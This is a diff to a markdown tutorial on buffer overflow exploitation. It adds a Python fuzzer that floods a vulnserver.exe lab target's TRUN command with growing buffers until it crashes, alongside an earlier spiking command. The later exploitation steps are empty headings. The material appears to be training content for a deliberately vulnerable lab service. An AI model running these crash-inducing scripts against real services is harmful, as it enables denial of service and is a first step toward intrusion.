@@ -1,4 +1,4 @@
-## Buffer Overflow Exploitation
+## 1. Buffer Overflow Exploitation
 
 #### Type Buffer Overflow
 * Stack-Based Buffer Overflow
@@ -8,7 +8,7 @@
 * ESI (Extended Source Index)
 * EDI (Extended Destination Index)
 
-## Simple Buffer Overflow in C Programming
+## 2. Simple Buffer Overflow in C Programming
 ### A. Stack Buffer Overflow
 ###### Save File : stack_bufferoverflow.c
 ```
@@ -63,7 +63,7 @@ gcc heap_overflow.c
 ./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
-## Windows Buffer Overflow Exploitation
+## 3. Windows Buffer Overflow Exploitation
 * Perform Spiking
 * Perform Fuzzing
 * Identify Offset
@@ -107,17 +107,46 @@ s_string_variable("0");
 generic send tcp 10.13.3.55 9999 trun.spk 0 0 
 ```
 
-#### Perform Fuzzing
+### B. Perform Fuzzing
 
-### Identify Offset
+###### Upload vulnserver.exe (to Victim)
 
-### Overwrite EIP Register
+##### Create File : fuzz.py (from Attacker)
+```
+#!/usr/bin/python2
+import sys, socket
+from time import sleep
 
-### Identify Bad Characters
+buff = "A" * 100
 
-### Generate Shellcode
+while True:
+	try:
+		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		soc.connect(('10.13.3.55', 9999))
+		soc.send(('TRUN /.:/' + buff))
+		soc.close()
+		sleep(1)
+		buff = buff + "A" * 100
+	except:
+		print "Fuzzing Crashed Vuln Server at %s bytes" % str(len(buff))
+		sys.exit()
+```
 
-### Gain Root Access
+##### Testing (from Attacker)
+```
+chmod +x fuzz.py
+./fuzz.py
+```
+
+### C. Identify Offset
+
+### D. Overwrite EIP Register
+
+### E. Identify Bad Characters
+
+### F. Generate Shellcode
+
+### G. Gain Root Access
 
 ## Bug
 
